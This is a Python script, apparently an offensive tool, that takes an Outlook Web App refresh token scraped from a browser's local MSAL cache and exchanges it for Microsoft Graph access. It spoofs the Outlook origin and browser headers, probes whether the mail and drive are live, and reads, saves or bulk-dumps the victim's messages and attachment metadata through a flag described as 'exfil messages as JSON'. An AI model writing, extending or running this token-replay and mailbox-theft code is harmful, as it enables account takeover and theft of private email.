#!/usr/bin/env python3
from __future__ import annotations

import argparse
import html
import json
import re
from html.parser import HTMLParser
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

from msal_peek import OWA_CLIENT, extract_credentials, fmt_expiry, pick_owa_refresh

TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
GRAPH = "https://graph.microsoft.com/v1.0"
GRAPH_SCOPE = "User.Read openid profile offline_access"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
ORIGIN = "https://outlook.live.com"

LIST_SEL = "id,subject,from,receivedDateTime,isRead,hasAttachments"
MSG_SEL = "id,subject,from,toRecipients,receivedDateTime,body,hasAttachments,bodyPreview"


def refresh_token(rt: str) -> dict[str, Any]:
    body = urllib.parse.urlencode(
        {
            "client_id": OWA_CLIENT,
            "grant_type": "refresh_token",
            "refresh_token": rt,
            "scope": GRAPH_SCOPE,
        }
    ).encode()
    req = urllib.request.Request(TOKEN_URL, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("Origin", ORIGIN)
    req.add_header("Referer", f"{ORIGIN}/")
    req.add_header("User-Agent", UA)
    req.add_header("Expect", "")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read().decode()
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode()
        try:
            err = json.loads(raw)
        except json.JSONDecodeError:
            raise RuntimeError(f"refresh failed ({exc.code}): {raw[:200]}") from exc
        raise RuntimeError(
            f"refresh failed ({exc.code}): {err.get('error')} - {str(err.get('error_description', ''))[:200]}"
        ) from exc
    out = json.loads(raw)
    if "access_token" not in out:
        raise RuntimeError(f"no access_token: {raw[:200]}")
    return out


class Graph:
    def __init__(self, token: str) -> None:
        self.token = token

    def get(self, url: str) -> tuple[int, Any]:
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Bearer {self.token}")
        req.add_header("Accept", "application/json")
        req.add_header("User-Agent", UA)
        try:
            with urllib.request.urlopen(req, timeout=60) as resp:
                return resp.status, json.loads(resp.read().decode())
        except urllib.error.HTTPError as exc:
            raw = exc.read().decode(errors="replace")
            try:
                return exc.code, json.loads(raw)
            except json.JSONDecodeError:
                return exc.code, raw[:500]

    def me(self) -> dict | None:
        code, body = self.get(f"{GRAPH}/me")
        return body if code == 200 and isinstance(body, dict) else None

    def messages(self, top: int, select: str = LIST_SEL) -> list[dict]:
        q = urllib.parse.urlencode(
            {"$top": top, "$select": select, "$orderby": "receivedDateTime desc"},
            quote_via=urllib.parse.quote,
        )
        code, body = self.get(f"{GRAPH}/me/messages?{q}")
        if code != 200 or not isinstance(body, dict):
            return []
        return body.get("value") or []

    def message(self, msg_id: str) -> dict | None:
        enc = urllib.parse.quote(msg_id, safe="")
        q = urllib.parse.urlencode({"$select": MSG_SEL}, quote_via=urllib.parse.quote)
        code, body = self.get(f"{GRAPH}/me/messages/{enc}?{q}")
        return body if code == 200 and isinstance(body, dict) else None

    def attachments(self, msg_id: str) -> list[dict]:
        enc = urllib.parse.quote(msg_id, safe="")
        code, body = self.get(f"{GRAPH}/me/messages/{enc}/attachments")
        if code != 200 or not isinstance(body, dict):
            return []
        return body.get("value") or []

    def probe(self) -> tuple[dict | None, bool, bool]:
        me = self.me()
        inbox = bool(self.messages(1))
        code, body = self.get(f"{GRAPH}/me/drive/root/children?$top=1")
        drive = code == 200 and isinstance(body, dict) and "value" in body
        return me, inbox, drive


def resolve_refresh_token(args: argparse.Namespace) -> str | None:
    if args.refresh_token:
        return args.refresh_token
    p = Path(args.source)
    if p.is_file() and p.suffix == ".json":
        blob = json.loads(p.read_text(encoding="utf-8"))
        if isinstance(blob, dict) and blob.get("refresh_token"):
            return blob["refresh_token"]
        if isinstance(blob, list):
            return (pick_owa_refresh(blob) or {}).get("secret")
    if p.exists():
        creds, _ = extract_credentials(p.resolve())
        row = pick_owa_refresh(creds)
        if row:
            print(f"[*] ldb refresh expires {fmt_expiry(row.get('expiresOn'))}")
            return row.get("secret")
    return None


def load_access_token(args: argparse.Namespace) -> str | None:
    if args.access_token:
        return args.access_token
    p = Path(args.source)
    if p.is_file() and p.suffix == ".json":
        blob = json.loads(p.read_text(encoding="utf-8"))
        if isinstance(blob, dict) and blob.get("access_token"):
            return blob["access_token"]
    return None


def fmt_addr(m: dict) -> str:
    return (m.get("from") or {}).get("emailAddress", {}).get("address", "?")


def print_inbox(msgs: list[dict]) -> None:
    for m in msgs:
        print(f"  {m.get('receivedDateTime', '?')}  {fmt_addr(m)}  {(m.get('subject') or '')[:80]}")


class _HtmlText(HTMLParser):
    BLOCK = frozenset(("p", "div", "br", "tr", "li", "h1", "h2", "h3", "h4", "table", "blockquote"))
    VOID = frozenset(
        ("area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "param", "source", "track", "wbr")
    )
    HIDDEN = re.compile(r"display\s*:\s*none|visibility\s*:\s*hidden|max-height\s*:\s*0", re.I)
    INVISIBLE = re.compile(r"[\u034f\u200b-\u200f\u202a-\u202e\u2060\ufeff\ufffc]")

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self._hide: list[bool] = []
        self._parts: list[str] = []

    def _hidden(self, attrs) -> bool:
        style = next((v for k, v in attrs if k == "style"), "")
        return bool(self.HIDDEN.search(style))

    def _skipping(self) -> bool:
        return any(self._hide)

    def handle_starttag(self, tag: str, attrs) -> None:
        hide = tag in ("script", "style", "head") or self._hidden(attrs)
        if tag not in self.VOID:
            self._hide.append(hide)
        if not self._skipping() and tag in self.BLOCK:
            self._parts.append("\n")

    def handle_endtag(self, tag: str) -> None:
        if tag not in self.VOID and self._hide:
            self._hide.pop()
        if not self._skipping() and tag in self.BLOCK:
            self._parts.append("\n")

    def handle_data(self, data: str) -> None:
        if self._skipping():
            return
        self._parts.append(data)

    def text(self) -> str:
        raw = html.unescape("".join(self._parts))
        raw = self.INVISIBLE.sub("", raw)
        raw = re.sub(r"[ \t]+\n", "\n", raw)
        lines: list[str] = []
        prev = ""
        for line in raw.splitlines():
            stripped = line.strip()
            if not stripped or stripped == prev:
                continue
            if len(stripped.replace(" ", "").replace("\xa0", "")) < 3:
                continue
            lines.append(stripped)
            prev = stripped
        return re.sub(r"\n{3,}", "\n\n", "\n".join(lines)).strip()


def html_to_text(content: str) -> str:
    parser = _HtmlText()
    try:
        parser.feed(content)
        parser.close()
    except Exception:
        content = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", content, flags=re.I | re.S)
        content = re.sub(r"<[^>]+>", "\n", content)
        return html.unescape(re.sub(r"\n{3,}", "\n\n", content)).strip()
    return parser.text()


def extract_body_text(m: dict) -> str:
    body = m.get("body") or {}
    raw = (body.get("content") or "").strip()
    ctype = (body.get("contentType") or "").lower()
    if raw:
        if ctype == "html" or raw.lstrip().startswith("<"):
            parsed = html_to_text(raw)
            if parsed:
                return parsed
        return raw
    preview = (m.get("bodyPreview") or "").strip()
    return preview


def save_message(m: dict, path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    ext = path.suffix.lower()
    if ext == ".json":
        path.write_text(json.dumps(m, indent=2, ensure_ascii=False), encoding="utf-8")
    elif ext in (".html", ".htm"):
        body = m.get("body") or {}
        path.write_text(body.get("content") or "", encoding="utf-8")
    else:
        path.write_text(extract_body_text(m), encoding="utf-8")


def print_message(m: dict, *, full: bool = False) -> None:
    body = m.get("body") or {}
    raw = body.get("content") or ""
    print(f"from   : {fmt_addr(m)}")
    print(f"date   : {m.get('receivedDateTime', '?')}")
    print(f"subject: {m.get('subject', '')}")
    print(f"id     : {m.get('id', '')}")
    print("---")
    if full:
        print(raw or m.get("bodyPreview") or "(empty)")
        return
    text = extract_body_text(m)
    print(text or "(empty)")


def safe_name(s: str, n: int = 60) -> str:
    s = re.sub(r"[^\w.\-]+", "_", s.strip())[:n].strip("_")
    return s or "msg"


def dump_messages(g: Graph, outdir: Path, msgs: list[dict], with_attachments: bool) -> int:
    outdir.mkdir(parents=True, exist_ok=True)
    manifest = []
    for m in msgs:
        mid = m.get("id")
        if not mid:
            continue
        full = g.message(mid)
        if not full:
            continue
        if with_attachments and full.get("hasAttachments"):
            full["attachments"] = g.attachments(mid)
        full["bodyText"] = extract_body_text(full)
        ts = (full.get("receivedDateTime") or "unknown")[:19].replace(":", "-")
        base = f"{ts}_{safe_name(fmt_addr(full))}_{safe_name(full.get('subject', ''), 40)}"
        (outdir / f"{base}.json").write_text(json.dumps(full, indent=2, ensure_ascii=False), encoding="utf-8")
        (outdir / f"{base}.txt").write_text(full["bodyText"], encoding="utf-8")
        fname = f"{base}.json"
        manifest.append(
            {
                "file": fname,
                "id": mid,
                "subject": full.get("subject"),
                "from": fmt_addr(full),
                "receivedDateTime": full.get("receivedDateTime"),
            }
        )
    (outdir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return len(manifest)


def main() -> int:
    ap = argparse.ArgumentParser(description="OWA refresh token -> Graph mail")
    ap.add_argument("source", nargs="?", default=str(Path(__file__).resolve().parent))
    ap.add_argument("--json", help="msal_peek export path")
    ap.add_argument("--refresh-token")
    ap.add_argument("--access-token")
    ap.add_argument("--cached", action="store_true", help="use access_token from json, skip refresh")
    ap.add_argument("--save", metavar="PATH")
    ap.add_argument("--refresh-only", action="store_true")
    ap.add_argument("--inbox", type=int, metavar="N")
    ap.add_argument("--msg", metavar="ID", help="read message by Graph id")
    ap.add_argument("--msg-index", type=int, metavar="N", help="read inbox index (0=newest)")
    ap.add_argument("--full", action="store_true", help="print full body (html) to terminal")
    ap.add_argument("--save-msg", metavar="PATH", help="save one message (.json, .html, .txt)")
    ap.add_argument("--dump", metavar="DIR", help="exfil messages as JSON")
    ap.add_argument("--top", type=int, default=25, help="count for --dump (default 25)")
    ap.add_argument("--attachments", action="store_true", help="fetch attachment metadata in --dump")
    args = ap.parse_args()

    if args.json:
        args.source = args.json

    rt = resolve_refresh_token(args)
    if args.access_token:
        access = args.access_token
    elif args.cached:
        access = load_access_token(args)
    else:
        access = None

    if not access and rt:
        try:
            payload = refresh_token(rt)
        except RuntimeError as exc:
            print(f"[-] refresh failed: {exc}")
            return 1
        access = payload["access_token"]
        print("[*] Refresh token: live")
        print(f"    scope      : {payload.get('scope', '?')}")
        print(f"    expires_in : {payload.get('expires_in', '?')}s")
        if payload.get("refresh_token"):
            print("    rotated RT : yes")
        if args.save:
            Path(args.save).write_text(json.dumps(payload, indent=2), encoding="utf-8")
            print(f"    saved      : {args.save}")

    if not access:
        print("[!] no token")
        return 1
    if args.refresh_only:
        return 0

    g = Graph(access)
    me, inbox_ok, drive_ok = g.probe()
    if not me:
        print("[-] graph: dead")
        return 1

    upn = me.get("userPrincipalName", "?")
    print(f"\n[+] MS Graph: live")
    print(f"    Graph mail for {upn}")
    print(f"    /me=200 inbox={200 if inbox_ok else 'err'} drive={200 if drive_ok else 'err'}")

    need_list = args.inbox or args.msg_index is not None or args.dump
    list_n = max(
        args.inbox or 0,
        (args.msg_index + 1) if args.msg_index is not None else 0,
        args.top if args.dump else 0,
    )
    msgs = g.messages(list_n) if need_list else []

    def show_message(m: dict | None) -> int:
        if not m:
            return 1
        if args.save_msg:
            save_message(m, Path(args.save_msg))
            print(f"    saved -> {args.save_msg}")
        print()
        print_message(m, full=args.full)
        return 0

    if args.msg:
        if show_message(g.message(args.msg)):
            print(f"[-] message not found: {args.msg[:40]}...")
            return 1

    if args.msg_index is not None:
        if args.msg_index < 0 or args.msg_index >= len(msgs):
            print(f"[-] msg-index {args.msg_index} out of range (have {len(msgs)})")
            return 1
        if show_message(g.message(msgs[args.msg_index]["id"])):
            return 1

    if args.dump:
        to_dump = msgs if msgs else g.messages(args.top)
        n = dump_messages(g, Path(args.dump), to_dump[: args.top], args.attachments)
        print(f"    wrote {n} -> {args.dump}/")

    if args.inbox:
        show = msgs[: args.inbox] if msgs else g.messages(args.inbox)
        print(f"\n--- inbox ({len(show)}) ---")
        print_inbox(show)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
